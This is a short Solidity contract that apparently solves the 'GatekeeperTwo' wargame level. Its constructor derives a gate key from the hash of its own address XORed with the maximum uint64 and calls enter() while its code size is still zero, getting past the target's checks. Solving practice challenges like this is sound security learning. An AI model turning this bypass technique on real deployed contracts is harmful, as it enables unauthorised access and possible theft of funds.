// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperTwo} from "./GatekeeperTwo.sol";

contract GatekeeperTwoHacker {
  constructor(address gatekeeperAddr) {
    GatekeeperTwo gatekeeper = GatekeeperTwo(gatekeeperAddr);
    bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(type(uint64).max));
    gatekeeper.enter(gateKey);
  }
}